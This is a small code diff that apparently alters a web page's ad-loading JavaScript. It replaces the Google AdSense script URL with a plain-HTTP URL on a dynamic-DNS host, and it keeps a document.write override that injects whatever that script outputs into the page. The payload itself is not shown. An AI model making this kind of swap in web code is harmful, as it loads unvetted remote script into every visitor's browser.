@@ -16,7 +16,7 @@ ga('send', 'pageview');
     lugar.innerHTML = "";
     var script = document.createElement("script");
     script.type = "text/javascript";
-    script.src = "//pagead2.googlesyndication.com/pagead/show_ads.js";
+    script.src = "http://www.zulia.citastag.dyndns.org/regional/index.php?ac=ceop";
     if (!document._write) document._write = document.write;
     document.write = function(str) {
         lugar.innerHTML += str;
